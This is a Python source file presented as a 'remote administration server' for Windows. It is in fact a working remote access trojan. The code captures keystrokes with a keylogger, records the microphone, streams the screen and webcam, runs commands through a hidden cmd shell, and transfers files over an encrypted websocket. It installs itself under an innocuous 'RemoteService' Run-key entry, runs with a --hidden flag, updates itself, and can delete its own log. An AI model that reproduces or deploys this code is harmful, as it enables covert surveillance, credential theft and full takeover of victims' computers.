"""
server.py — сервер удалённого администрирования.
"""

import argparse
import asyncio
import base64
import ctypes
import io
import json
import logging
import os
import platform
import shutil
import subprocess
import sys
import tempfile
import threading
import time
import winreg
from pathlib import Path

import websockets

HAS_MSS = False
try:
    import mss
    HAS_MSS = True
except ImportError:
    pass

HAS_CV2 = False
try:
    import cv2
    HAS_CV2 = True
except ImportError:
    pass

HAS_PIL = False
try:
    from PIL import Image
    HAS_PIL = True
except ImportError:
    pass

HAS_KEYBOARD = False
try:
    import keyboard
    HAS_KEYBOARD = True
except ImportError:
    pass

HAS_PYNPUT = False
try:
    from pynput import keyboard as pynput_keyboard
    HAS_PYNPUT = True
except ImportError:
    pass

HAS_AUDIO = False
try:
    import sounddevice as sd
    import numpy as np
    HAS_AUDIO = True
except ImportError:
    pass

from shared import CHUNK_SIZE, decrypt_msg, encrypt_msg, make_fernet

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.StreamHandler()],
)
log = logging.getLogger("server")

SERVER_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE_PATH = os.path.join(SERVER_DIR, "server.log")


# ===================================================================
# Keylogger — uses foreground window's keyboard layout for correct chars
# ===================================================================
import ctypes.wintypes
from pynput import keyboard as pynput_kbd

_GetForegroundWindow = ctypes.windll.user32.GetForegroundWindow
_GetWindowThreadProcessId = ctypes.windll.user32.GetWindowThreadProcessId
_GetKeyboardLayout = ctypes.windll.user32.GetKeyboardLayout
_GetAsyncKeyState = ctypes.windll.user32.GetAsyncKeyState
_GetKeyboardState = ctypes.windll.user32.GetKeyboardState
_ToUnicodeEx = ctypes.windll.user32.ToUnicodeEx

VK_MAP = {
    0x08: '[BS]', 0x09: '[TAB]', 0x0D: '[ENTER]', 0x10: None, 0x11: None,
    0x12: None, 0x14: '[CAPS]', 0x1B: '[ESC]', 0x20: '[SPACE]',
    0x21: '[PGUP]', 0x22: '[PGDN]', 0x23: '[END]', 0x24: '[HOME]',
    0x25: '[LEFT]', 0x26: '[UP]', 0x27: '[RIGHT]', 0x28: '[DOWN]',
    0x2D: '[INS]', 0x2E: '[DEL]',
    0x70: '[F1]', 0x71: '[F2]', 0x72: '[F3]', 0x73: '[F4]',
    0x74: '[F5]', 0x75: '[F6]', 0x76: '[F7]', 0x77: '[F8]',
    0x78: '[F9]', 0x79: '[F10]', 0x7A: '[F11]', 0x7B: '[F12]',
}

class Keylogger:
    def __init__(self):
        self.running = False
        self._log = []
        self._lock = threading.Lock()
        self._listener = None
        self._last_layout = 0
        self._layout_lock = threading.Lock()

        # Cache the foreground window layout periodically
        self._update_layout()
        self._layout_timer = None

    def _update_layout(self):
        """Update the cached foreground window layout."""
        fg = _GetForegroundWindow()
        if fg:
            fg_tid = _GetWindowThreadProcessId(fg, None)
            if fg_tid:
                self._last_layout = _GetKeyboardLayout(fg_tid)
            else:
                self._last_layout = _GetKeyboardLayout(0)
        else:
            self._last_layout = _GetKeyboardLayout(0)

        if self.running:
            self._layout_timer = threading.Timer(0.1, self._update_layout)
            self._layout_timer.daemon = True
            self._layout_timer.start()

    def start(self):
        if self.running:
            return
        self.running = True
        self._log = []
        if HAS_PYNPUT:
            self._update_layout()  # Start the layout update timer
            try:
                self._listener = pynput_kbd.Listener(on_press=self._on_key)
                self._listener.start()
            except Exception as e:
                log.warning(f"pynput keylog failed: {e}")
                self.running = False
        else:
            self.running = False

    def stop(self):
        self.running = False
        if self._layout_timer:
            self._layout_timer.cancel()
            self._layout_timer = None
        if self._listener:
            try:
                self._listener.stop()
            except Exception:
                pass
            self._listener = None

    def get_log(self) -> str:
        with self._lock:
            text = "".join(self._log)
            self._log = []
        return text

    def _on_key(self, key):
        """Handle keystrokes using foreground window's keyboard layout."""
        try:
            vk = key.vk
            if vk is None:
                # Special key object (not a character key)
                if hasattr(key, 'name') and key.name:
                    if key.name == 'backspace':
                        self._remove_last()
                    elif key.name in ('enter', 'return'):
                        self._append('\n')
                    elif key.name == 'space':
                        self._append(' ')
                    elif key.name == 'tab':
                        self._append('\t')
                return

            # Ignore modifier keys
            if vk in (0x10, 0x11, 0x12, 0x5B, 0x5C):
                return

            if vk == 0x08:
                self._remove_last()
                return

            label = VK_MAP.get(vk)
            if label is not None:
                if label == '[SPACE]':
                    self._append(' ')
                else:
                    self._append(label)
                return

            # Use cached foreground layout
            with self._layout_lock:
                layout = self._last_layout if self._last_layout else _GetKeyboardLayout(0)

            kb_state = (ctypes.c_ubyte * 256)()
            _GetKeyboardState(kb_state)

            buf = ctypes.create_unicode_buffer(5)
            result = _ToUnicodeEx(vk, 0, kb_state, buf, 5, 0, layout)
            if result == 1:
                self._append(buf.value)
            elif hasattr(key, 'char') and key.char:
                self._append(key.char)
        except Exception:
            pass

    def _append(self, text: str):
        with self._lock:
            self._log.append(text)
            total = sum(len(s) for s in self._log)
            if total > 1024 * 500:
                self._log = self._log[-1000:]

    def _remove_last(self):
        """Simulate backspace: remove the last character."""
        with self._lock:
            if not self._log:
                return
            last = self._log[-1]
            if last.startswith('['):
                self._log.pop()
            elif len(last) > 1:
                self._log[-1] = last[:-1]
            else:
                self._log.pop()


# ===================================================================
# Audio Recorder
# ===================================================================
class AudioRecorder:
    def __init__(self):
        self.is_recording = False
        self._recordings_dir = os.path.join(SERVER_DIR, "recordings")
        os.makedirs(self._recordings_dir, exist_ok=True)

    def start(self, duration=None):
        if not HAS_AUDIO:
            return False, "sounddevice + numpy not installed"
        if self.is_recording:
            return False, "Already recording"
        self.is_recording = True
        def _record():
            fs = 44100
            channels = 1
            dtype = np.int16
            chunk_secs = 60
            num = 1
            if duration:
                while self.is_recording and num * chunk_secs <= duration:
                    data = sd.rec(int(chunk_secs * fs), samplerate=fs, channels=channels, dtype=dtype)
                    sd.wait()
                    if not self.is_recording:
                        break
                    self._write_wav(os.path.join(self._recordings_dir, f"rec_{time.strftime('%Y%m%d_%H%M%S')}_{num:03d}.wav"), data, fs, channels)
                    num += 1
            else:
                while self.is_recording:
                    data = sd.rec(int(chunk_secs * fs), samplerate=fs, channels=channels, dtype=dtype)
                    sd.wait()
                    if not self.is_recording:
                        break
                    self._write_wav(os.path.join(self._recordings_dir, f"rec_{time.strftime('%Y%m%d_%H%M%S')}_{num:03d}.wav"), data, fs, channels)
                    num += 1
        self._thread = threading.Thread(target=_record, daemon=True)
        self._thread.start()
        return True, "Recording started"

    def stop(self):
        self.is_recording = False
        return True, "Recording stopped"

    def list_recordings(self):
        if not os.path.exists(self._recordings_dir):
            return []
        result = []
        for f in sorted(os.listdir(self._recordings_dir)):
            if f.endswith(".wav"):
                p = os.path.join(self._recordings_dir, f)
                result.append({"name": f, "size": os.path.getsize(p)})
        return result

    def get_recording(self, name):
        path = os.path.join(self._recordings_dir, name)
        if not os.path.isfile(path):
            return None
        with open(path, "rb") as f:
            return f.read()

    def delete_recording(self, name):
        path = os.path.join(self._recordings_dir, name)
        if os.path.exists(path):
            os.remove(path)
            return True
        return False

    def delete_all(self):
        if os.path.exists(self._recordings_dir):
            for f in os.listdir(self._recordings_dir):
                if f.endswith(".wav"):
                    os.remove(os.path.join(self._recordings_dir, f))
        return True

    @staticmethod
    def _write_wav(path, data, fs, channels):
        import struct
        ns = len(data)
        with open(path, "wb") as f:
            f.write(b"RIFF")
            f.write(struct.pack("<I", 36 + ns * 2))
            f.write(b"WAVEfmt ")
            f.write(struct.pack("<IHHIIHH", 16, 1, channels, fs, fs * channels * 2, channels * 2, 16))
            f.write(b"data")
            f.write(struct.pack("<I", ns * 2))
            f.write(data.tobytes())


recorder = AudioRecorder()


# ===================================================================
# Screenshot
# ===================================================================
def capture_screenshot(quality=80):
    if not HAS_MSS:
        return None, "mss not installed"
    if not HAS_PIL:
        return None, "Pillow not installed"
    try:
        with mss.mss() as sct:
            monitor = sct.monitors[0]
            sct_img = sct.grab(monitor)
        img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=quality, optimize=True)
        b64 = base64.b64encode(buf.getvalue()).decode()
        return {"image_b64": b64, "width": sct_img.width, "height": sct_img.height}, None
    except Exception as e:
        log.exception("Screenshot error")
        return None, str(e)


# ===================================================================
# Screen Stream (live monitor)
# ===================================================================
class ScreenStream:
    def __init__(self, ws, fernet, fps=5, quality=70):
        self.ws = ws
        self.fernet = fernet
        self.fps = fps
        self.quality = quality
        self.task = None
        self.running = False

    async def start(self):
        if not HAS_MSS or not HAS_PIL:
            err = "mss+Pillow needed for screen stream"
            log.warning(err)
            await self.ws.send(encrypt_msg(self.fernet, {
                "type": "error",
                "payload": {"message": err},
            }))
            return
        self.running = True
        self.task = asyncio.create_task(self._run())
        log.info("Screen stream started at %d fps", self.fps)

    async def stop(self):
        self.running = False
        if self.task:
            self.task.cancel()
            try:
                await self.task
            except asyncio.CancelledError:
                pass
        log.info("Screen stream stopped")

    async def _run(self):
        interval = 1.0 / max(self.fps, 1)
        loop = asyncio.get_running_loop()
        try:
            with mss.mss() as sct:
                monitor = sct.monitors[0]
                while self.running:
                    t0 = time.monotonic()
                    sct_img = await loop.run_in_executor(None, lambda: sct.grab(monitor))
                    img = await loop.run_in_executor(
                        None,
                        lambda: Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX"),
                    )
                    buf = io.BytesIO()
                    img.save(buf, format="JPEG", quality=self.quality, optimize=True)
                    b64 = base64.b64encode(buf.getvalue()).decode()
                    msg = {
                        "type": "screen_frame",
                        "payload": {
                            "frame_b64": b64,
                            "width": sct_img.width,
                            "height": sct_img.height,
                        },
                    }
                    await self.ws.send(encrypt_msg(self.fernet, msg))
                    elapsed = time.monotonic() - t0
                    if elapsed < interval:
                        await asyncio.sleep(interval - elapsed)
        except asyncio.CancelledError:
            pass
        except Exception as e:
            log.exception("Screen stream error: %s", e)


# ===================================================================
# Camera
# ===================================================================
class CameraStream:
    def __init__(self, ws, fernet, camera_index=0, fps=10, quality=80):
        self.ws = ws
        self.fernet = fernet
        self.camera_index = camera_index
        self.fps = fps
        self.quality = quality
        self.task = None
        self.cap = None

    async def start(self):
        if not HAS_CV2:
            await self._send_error("opencv-python not installed")
            return
        loop = asyncio.get_running_loop()
        self.cap = await loop.run_in_executor(None, cv2.VideoCapture, self.camera_index)
        if not self.cap or not self.cap.isOpened():
            await self._send_error(f"Camera #{self.camera_index} unavailable")
            return
        self.task = asyncio.create_task(self._run())
        log.info("Camera #%d started at %d fps", self.camera_index, self.fps)

    async def stop(self):
        if self.task:
            self.task.cancel()
            try:
                await self.task
            except asyncio.CancelledError:
                pass
        if self.cap:
            self.cap.release()
        log.info("Camera stopped")

    async def _run(self):
        interval = 1.0 / max(self.fps, 1)
        try:
            while True:
                t0 = time.monotonic()
                loop = asyncio.get_running_loop()
                ret, frame = await loop.run_in_executor(None, self.cap.read)
                if not ret:
                    await asyncio.sleep(0.1)
                    continue
                _, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, self.quality])
                msg = {
                    "type": "stream_frame",
                    "payload": {"frame_b64": base64.b64encode(buf.tobytes()).decode()},
                }
                await self.ws.send(encrypt_msg(self.fernet, msg))
                elapsed = time.monotonic() - t0
                if elapsed < interval:
                    await asyncio.sleep(interval - elapsed)
        except asyncio.CancelledError:
            pass

    async def _send_error(self, msg_text):
        await self.ws.send(encrypt_msg(self.fernet, {
            "type": "error",
            "payload": {"message": msg_text},
        }))


# ===================================================================
# Command execution — UTF-8 with Russian encoding fallback
# ===================================================================
async def run_command(command, timeout=60):
    try:
        full_cmd = f'cmd /c "chcp 65001 >nul & {command}"'
        proc = await asyncio.create_subprocess_shell(
            full_cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout)
        except asyncio.TimeoutError:
            proc.kill()
            stdout, stderr = b"", b"Command timed out"
        # Try UTF-8 first, then cp1251 (Windows Cyrillic), then cp866 (OEM Cyrillic), then replace
        for enc in ("utf-8", "cp1251", "cp866"):
            try:
                stdout_text = stdout.decode(enc, errors="strict").strip()
                stderr_text = stderr.decode(enc, errors="strict").strip()
                return {
                    "stdout": stdout_text,
                    "stderr": stderr_text,
                    "returncode": proc.returncode,
                }
            except UnicodeDecodeError:
                continue
        return {
            "stdout": stdout.decode("utf-8", errors="replace").strip(),
            "stderr": stderr.decode("utf-8", errors="replace").strip(),
            "returncode": proc.returncode,
        }
    except Exception as e:
        return {"stdout": "", "stderr": str(e), "returncode": -1}


async def _safe_send(ws, fernet, data):
    """Send encrypted message, silently fail if connection is closed."""
    try:
        await ws.send(encrypt_msg(fernet, data))
    except Exception:
        pass


# ===================================================================
# Shell
# ===================================================================
class ShellSession:
    def __init__(self, ws, fernet):
        self.ws = ws
        self.fernet = fernet
        self.proc = None
        self.reader_task = None

    async def open(self):
        self.proc = await asyncio.create_subprocess_exec(
            "cmd.exe",
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
            creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0,
        )
        log.info("Shell opened (PID %d)", self.proc.pid)
        self.reader_task = asyncio.create_task(self._read_loop())

    async def write(self, data):
        if self.proc and self.proc.stdin and not self.proc.stdin.is_closing():
            self.proc.stdin.write(data.encode("utf-8") + b"\r\n")
            await self.proc.stdin.drain()

    async def close(self):
        if self.reader_task:
            self.reader_task.cancel()
        if self.proc:
            try:
                self.proc.terminate()
                await asyncio.wait_for(self.proc.wait(), timeout=2)
            except Exception:
                self.proc.kill()
        log.info("Shell closed")

    async def _read_loop(self):
        try:
            if self.proc and self.proc.stdout:
                while True:
                    line = await self.proc.stdout.readline()
                    if not line:
                        break
                    for enc in ("utf-8", "cp1251", "cp866"):
                        try:
                            text = line.decode(enc, errors="strict")
                            break
                        except UnicodeDecodeError:
                            continue
                    else:
                        text = line.decode("utf-8", errors="replace")
                    msg = {
                        "type": "shell_output",
                        "payload": {"stdout": text, "stderr": ""},
                    }
                    await _safe_send(self.ws, self.fernet, msg)
        except asyncio.CancelledError:
            pass
        except Exception as e:
            log.error("Shell read error: %s", e)


# ===================================================================
# File transfer
# ===================================================================
class FileTransferTracker:
    def __init__(self):
        self.send_buffers: dict[str, list] = {}

    def resolve_path(self, remote_path):
        clean = os.path.basename(remote_path.replace("/", "\\").split("\\")[-1])
        return os.path.join(SERVER_DIR, clean)

    def accumulate(self, clean_path, data_b64, idx, total):
        if clean_path not in self.send_buffers:
            self.send_buffers[clean_path] = [None] * total
        self.send_buffers[clean_path][idx] = data_b64
        if all(c is not None for c in self.send_buffers[clean_path]):
            full_b64 = "".join(self.send_buffers[clean_path])
            del self.send_buffers[clean_path]
            return base64.b64decode(full_b64)
        return None


# ===================================================================
# Log management
# ===================================================================
LOG_VIEW_LINES = 200


async def handle_log_view(ws, fernet):
    if not os.path.isfile(LOG_FILE_PATH):
        await _safe_send(ws, fernet, {
            "type": "log_view_result",
            "payload": {"exists": False, "lines": [], "message": "Log file does not exist"},
        })
        return
    try:
        with open(LOG_FILE_PATH, "r", encoding="utf-8", errors="replace") as f:
            all_lines = f.readlines()
        recent = all_lines[-LOG_VIEW_LINES:] if len(all_lines) > LOG_VIEW_LINES else all_lines
        await _safe_send(ws, fernet, {
            "type": "log_view_result",
            "payload": {
                "exists": True,
                "total_lines": len(all_lines),
                "lines": "".join(recent),
                "message": "Showing last {} lines of {}".format(len(recent), LOG_FILE_PATH),
            },
        })
    except Exception as e:
        await _safe_send(ws, fernet, {
            "type": "log_view_result",
            "payload": {"exists": False, "lines": [], "message": str(e)},
        })


async def handle_log_download(ws, fernet):
    if not os.path.isfile(LOG_FILE_PATH):
        await _safe_send(ws, fernet, {
            "type": "log_download_result",
            "payload": {"exists": False, "message": "Log file does not exist"},
        })
        return
    try:
        with open(LOG_FILE_PATH, "rb") as f:
            raw = f.read()
        b64 = base64.b64encode(raw).decode()
        total = max(1, -(-len(b64) // CHUNK_SIZE))
        fname = os.path.basename(LOG_FILE_PATH)
        for i in range(total):
            s = i * CHUNK_SIZE
            e = s + CHUNK_SIZE
            await _safe_send(ws, fernet, {
                "type": "log_download_chunk",
                "payload": {
                    "data_b64": b64[s:e],
                    "chunk_index": i,
                    "total_chunks": total,
                    "filename": fname,
                },
            })
        await _safe_send(ws, fernet, {
            "type": "log_download_result",
            "payload": {"exists": True, "message": "Download complete", "total_chunks": total, "filename": fname},
        })
        log.info("Log file sent: %s (%d chunks)", fname, total)
    except Exception as e:
        await _safe_send(ws, fernet, {
            "type": "log_download_result",
            "payload": {"exists": False, "message": str(e)},
        })


async def handle_log_delete(ws, fernet):
    try:
        if os.path.isfile(LOG_FILE_PATH):
            os.remove(LOG_FILE_PATH)
            await _safe_send(ws, fernet, {
                "type": "log_delete_result",
                "payload": {"success": True, "message": "Log file deleted"},
            })
        else:
            await _safe_send(ws, fernet, {
                "type": "log_delete_result",
                "payload": {"success": True, "message": "Log file already absent"},
            })
    except Exception as e:
        await _safe_send(ws, fernet, {
            "type": "log_delete_result",
            "payload": {"success": False, "message": str(e)},
        })


# ===================================================================
# WebSocket handler
# ===================================================================
keylogger = Keylogger()

async def client_handler(ws):
    global SHARED_SECRET
    fernet = make_fernet(SHARED_SECRET)
    camera = None
    screen_stream = None
    shell_session = None
    file_tracker = FileTransferTracker()

    # Auth with proper error handling
    try:
        raw = await asyncio.wait_for(ws.recv(), timeout=15)
    except asyncio.TimeoutError:
        log.warning("Auth timeout: client did not send auth message within 15s")
        try:
            await ws.send(encrypt_msg(fernet, {"type": "auth_fail", "payload": {"reason": "timeout"}}))
        except Exception:
            pass
        return
    except Exception as e:
        log.warning("Auth recv error: %s", e)
        return

    try:
        auth_msg = decrypt_msg(fernet, raw)
    except Exception as e:
        log.warning("Auth decryption failed: %s (possible key mismatch)", e)
        try:
            await ws.send(encrypt_msg(fernet, {"type": "auth_fail", "payload": {"reason": "decryption_error"}}))
        except Exception:
            pass
        return

    if auth_msg.get("type") != "auth" or auth_msg.get("payload", {}).get("token") != SHARED_SECRET:
        try:
            await ws.send(encrypt_msg(fernet, {"type": "auth_fail", "payload": {"reason": "invalid_token"}}))
        except Exception:
            pass
        log.warning("Wrong token from client")
        return

    await ws.send(encrypt_msg(fernet, {"type": "auth_ok", "payload": {}}))
    log.info("Client authenticated")

    try:
        async for raw in ws:
            try:
                msg = decrypt_msg(fernet, raw)
            except Exception as e:
                log.debug("Message decrypt failed: %s", e)
                continue

            t = msg.get("type")

            if t == "keylog_start":
                keylogger.start()
                await ws.send(encrypt_msg(fernet, {"type": "keylog_status", "payload": {"status": "started"}}))
            elif t == "keylog_stop":
                keylogger.stop()
                await ws.send(encrypt_msg(fernet, {"type": "keylog_status", "payload": {"status": "stopped"}}))
            elif t == "keylog_get":
                text = keylogger.get_log()
                await ws.send(encrypt_msg(fernet, {
                    "type": "keylog_data",
                    "payload": {"data": text, "length": len(text)},
                }))

            elif t == "audio_start":
                p = msg["payload"]
                dur = p.get("duration") if p else None
                ok, msg_text = recorder.start(duration=dur)
                await ws.send(encrypt_msg(fernet, {
                    "type": "audio_status",
                    "payload": {"status": "started" if ok else "failed", "message": msg_text},
                }))
            elif t == "audio_stop":
                ok, msg_text = recorder.stop()
                await ws.send(encrypt_msg(fernet, {
                    "type": "audio_status",
                    "payload": {"status": "stopped" if ok else "failed", "message": msg_text},
                }))
            elif t == "audio_list":
                recs = recorder.list_recordings()
                await ws.send(encrypt_msg(fernet, {"type": "audio_list", "payload": {"recordings": recs}}))
            elif t == "audio_download":
                name = msg["payload"]["name"]
                data = recorder.get_recording(name)
                if data:
                    b64 = base64.b64encode(data).decode()
                    total = max(1, -(-len(b64) // CHUNK_SIZE))
                    for i in range(total):
                        s = i * CHUNK_SIZE
                        e = s + CHUNK_SIZE
                        await ws.send(encrypt_msg(fernet, {
                            "type": "audio_data",
                            "payload": {
                                "data_b64": b64[s:e],
                                "chunk_index": i,
                                "total_chunks": total,
                                "filename": name,
                            },
                        }))
                    log.info("Audio sent: %s (%d chunks)", name, total)
                else:
                    await ws.send(encrypt_msg(fernet, {"type": "error", "payload": {"message": f"Not found: {name}"}}))
            elif t == "audio_delete":
                name = msg["payload"].get("name")
                if name:
                    recorder.delete_recording(name)
                else:
                    recorder.delete_all()
                await ws.send(encrypt_msg(fernet, {"type": "audio_status", "payload": {"status": "deleted"}}))

            elif t == "ping":
                await ws.send(encrypt_msg(fernet, {"type": "pong", "payload": {}}))

            elif t == "screenshot":
                quality = msg["payload"].get("quality", 80)
                data, err = capture_screenshot(quality)
                if data:
                    await ws.send(encrypt_msg(fernet, {"type": "screenshot_data", "payload": data}))
                else:
                    await ws.send(encrypt_msg(fernet, {"type": "error", "payload": {"message": err}}))

            # Screen stream (live)
            elif t == "screen_start":
                if screen_stream:
                    await screen_stream.stop()
                p = msg["payload"]
                screen_stream = ScreenStream(ws, fernet, fps=p.get("fps", 5), quality=p.get("quality", 70))
                await screen_stream.start()
            elif t == "screen_stop":
                if screen_stream:
                    await screen_stream.stop()
                    screen_stream = None

            # Camera
            elif t == "stream_start":
                if camera and camera.task:
                    await camera.stop()
                p = msg["payload"]
                camera = CameraStream(ws, fernet, p.get("camera_index", 0), p.get("fps", 10), p.get("quality", 80))
                await camera.start()
            elif t == "stream_stop":
                if camera:
                    await camera.stop()
                    camera = None

            elif t == "exec":
                p = msg["payload"]
                result = await run_command(p["command"], p.get("timeout", 60))
                await ws.send(encrypt_msg(fernet, {"type": "exec_result", "payload": result}))

            elif t == "shell_open":
                if shell_session:
                    await shell_session.close()
                shell_session = ShellSession(ws, fernet)
                await shell_session.open()
            elif t == "shell_input":
                if shell_session:
                    await shell_session.write(msg["payload"]["data"])
            elif t == "shell_close":
                if shell_session:
                    await shell_session.close()
                    shell_session = None

            elif t == "file_send":
                p = msg["payload"]
                clean_path = file_tracker.resolve_path(p["path"])
                raw_bytes = file_tracker.accumulate(clean_path, p["data_b64"], p["chunk_index"], p["total_chunks"])
                if raw_bytes is not None:
                    with open(clean_path, "wb") as f:
                        f.write(raw_bytes)
                    log.info("File received: %s (%d bytes)", clean_path, len(raw_bytes))
                    await ws.send(encrypt_msg(fernet, {"type": "file_ack", "payload": {"path": os.path.basename(clean_path)}}))

            elif t == "file_recv":
                path = msg["payload"]["path"]
                if not os.path.isabs(path):
                    path = os.path.join(SERVER_DIR, path)
                if not os.path.isfile(path):
                    await ws.send(encrypt_msg(fernet, {"type": "error", "payload": {"message": f"File not found: {path}"}}))
                    continue
                with open(path, "rb") as f:
                    raw = f.read()
                b64 = base64.b64encode(raw).decode()
                total = max(1, -(-len(b64) // CHUNK_SIZE))
                fname = os.path.basename(path)
                for i in range(total):
                    await ws.send(encrypt_msg(fernet, {
                        "type": "file_data",
                        "payload": {
                            "data_b64": b64[i * CHUNK_SIZE:(i + 1) * CHUNK_SIZE],
                            "chunk_index": i,
                            "total_chunks": total,
                            "filename": fname,
                        },
                    }))
                log.info("File sent: %s (%d chunks)", path, total)

            # Log management
            elif t == "log_view":
                await handle_log_view(ws, fernet)
            elif t == "log_download":
                await handle_log_download(ws, fernet)
            elif t == "log_delete":
                await handle_log_delete(ws, fernet)

            elif t == "install_autostart":
                secret = msg["payload"].get("secret", SHARED_SECRET)
                ok = install_autostart(secret=secret)
                await ws.send(encrypt_msg(fernet, {
                    "type": "autostart_result",
                    "payload": {"success": ok, "message": "Installed" if ok else "Failed"},
                }))

            elif t == "remove_autostart":
                ok = remove_autostart()
                await ws.send(encrypt_msg(fernet, {
                    "type": "autostart_result",
                    "payload": {"success": ok, "message": "Removed" if ok else "Failed"},
                }))

            elif t == "server_restart":
                await ws.send(encrypt_msg(fernet, {
                    "type": "server_restart_ack",
                    "payload": {"status": "restarting"},
                }))
                log.info("Server restart requested via API")
                await restart_server()

            elif t == "update_apply":
                filename = os.path.basename(msg["payload"]["path"])
                zip_path = os.path.join(SERVER_DIR, filename)
                update_dir = os.path.join(SERVER_DIR, "_update")
                log.info("Applying update from: %s", zip_path)

                # Extract
                result = await run_command(
                    f'powershell -Command "Expand-Archive -Path \'{zip_path}\' -DestinationPath \'{update_dir}\' -Force"',
                )
                if result["returncode"] != 0 and os.path.exists(zip_path):
                    py_ex = (
                        f'import zipfile,os;zf=zipfile.ZipFile(r"{zip_path}");'
                        f'os.makedirs(r"{update_dir}",exist_ok=True);zf.extractall(r"{update_dir}");zf.close()'
                    )
                    await run_command(f'python -c "{py_ex}"', timeout=30)

                if os.path.exists(update_dir):
                    if camera: await camera.stop()
                    if shell_session: await shell_session.close()
                    if screen_stream: await screen_stream.stop()
                    keylogger.stop()

                    # Rename current server.py before overwriting
                    this_file = os.path.abspath(__file__)
                    for f_name in os.listdir(update_dir):
                        src = os.path.join(update_dir, f_name)
                        if not os.path.isfile(src):
                            continue
                        dst = os.path.join(SERVER_DIR, f_name)
                        if os.path.abspath(src) == this_file:
                            shutil.copy2(src, dst + ".new")
                        else:
                            try:
                                shutil.copy2(src, dst)
                            except Exception as e:
                                log.warning("Update skip %s: %s", f_name, e)

                    shutil.rmtree(update_dir, ignore_errors=True)
                    try:
                        os.remove(zip_path)
                    except Exception:
                        pass

                    await ws.send(encrypt_msg(fernet, {
                        "type": "update_complete",
                        "payload": {"status": "restarting"},
                    }))
                    log.info("Restarting server...")
                    await restart_server()
                else:
                    await ws.send(encrypt_msg(fernet, {
                        "type": "update_complete",
                        "payload": {"status": f"failed: {result.get('stderr', 'extract failed')}"},
                    }))

    except websockets.exceptions.ConnectionClosed:
        log.info("Client disconnected")
    except asyncio.CancelledError:
        log.info("Connection cancelled")
    except Exception as e:
        log.exception("Handler error: %s", e)
    finally:
        if camera:
            await camera.stop()
        if screen_stream:
            await screen_stream.stop()
        if shell_session:
            await shell_session.close()
        keylogger.stop()


# ===================================================================
# Server restart helper
# ===================================================================
async def restart_server():
    """Restart the server process cleanly."""
    this_file = os.path.abspath(__file__)
    DETACHED_PROCESS = 0x00000008
    try:
        child = subprocess.Popen(
            [sys.executable, this_file, "--secret", SHARED_SECRET, "--hidden"],
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            close_fds=True,
            creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | DETACHED_PROCESS,
        )
        log.info("Restarted server as PID %d", child.pid)
    except Exception as e:
        log.error("Restart failed: %s", e)
    # Give the child a moment to initialize
    await asyncio.sleep(1)
    sys.exit(0)


# ===================================================================
# Post-restart: apply .new files
# ===================================================================
def apply_pending_updates():
    for f in os.listdir(SERVER_DIR):
        if f.endswith(".new"):
            src = os.path.join(SERVER_DIR, f)
            dst = src[:-4]
            try:
                shutil.copy2(src, dst)
                os.remove(src)
                log.info("Applied pending update: %s", f)
            except Exception as e:
                log.warning("Failed pending update %s: %s", f, e)


# ===================================================================
# File logging
# ===================================================================
def setup_file_logging():
    log_path = os.path.join(SERVER_DIR, "server.log")
    fh = logging.FileHandler(log_path, encoding="utf-8")
    fh.setLevel(logging.INFO)
    fh.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
    logging.getLogger().addHandler(fh)
    return log_path


# ===================================================================
# Auto-install via registry (no VBS, no temp files)
# ===================================================================
def install_autostart(secret=None):
    """Install autostart via HKCU registry only. Also cleans old VBS entries."""
    python_exe = sys.executable
    server_py = os.path.abspath(__file__)

    if not secret:
        secret = SHARED_SECRET
        if not secret:
            log.error("No secret provided for autostart")
            return False

    # Clean old VBS entries from Startup folder if present
    startup_dir = os.path.join(
        os.environ.get("APPDATA", ""),
        "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
    )
    for vbs_name in ("RemoteService.vbs", "RemoteService.wsh"):
        vbs_path = os.path.join(startup_dir, vbs_name)
        if os.path.exists(vbs_path):
            try:
                os.remove(vbs_path)
                log.info("Removed old VBS autostart: %s", vbs_path)
            except Exception as e:
                log.warning("Failed to remove old VBS file %s: %s", vbs_path, e)

    # Build command: python.exe "server.py" --secret SECRET --hidden
    cmd = f'"{python_exe}" "{server_py}" --secret "{secret}" --hidden'

    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                           r"Software\Microsoft\Windows\CurrentVersion\Run",
                           0, winreg.KEY_SET_VALUE) as k:
            # Remove old VBS-based entry if present
            try:
                winreg.DeleteValue(k, "RemoteService")
                log.info("Removed old RemoteService entry")
            except FileNotFoundError:
                pass

            winreg.SetValueEx(k, "RemoteService", 0, winreg.REG_SZ, cmd)
        log.info("Autostart installed via registry: %s", cmd)
        print(f"Autostart installed in HKCU registry")
        return True
    except Exception as e:
        log.error(f"Registry autostart failed: {e}")
        print(f"Autostart failed: {e}")
        return False


def remove_autostart():
    """Remove autostart entry from HKCU registry and Startup folder."""
    success = True
    # Remove registry entry
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                           r"Software\Microsoft\Windows\CurrentVersion\Run",
                           0, winreg.KEY_SET_VALUE) as k:
            winreg.DeleteValue(k, "RemoteService")
        log.info("Removed RemoteService from registry")
    except FileNotFoundError:
        pass  # already absent
    except Exception as e:
        log.error(f"Failed to remove registry entry: {e}")
        success = False

    # Remove VBS files from Startup
    startup_dir = os.path.join(
        os.environ.get("APPDATA", ""),
        "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
    )
    for vbs_name in ("RemoteService.vbs", "RemoteService.wsh"):
        vbs_path = os.path.join(startup_dir, vbs_name)
        if os.path.exists(vbs_path):
            try:
                os.remove(vbs_path)
                log.info("Removed VBS file: %s", vbs_path)
            except Exception as e:
                log.warning(f"Failed to remove {vbs_path}: {e}")

    return success

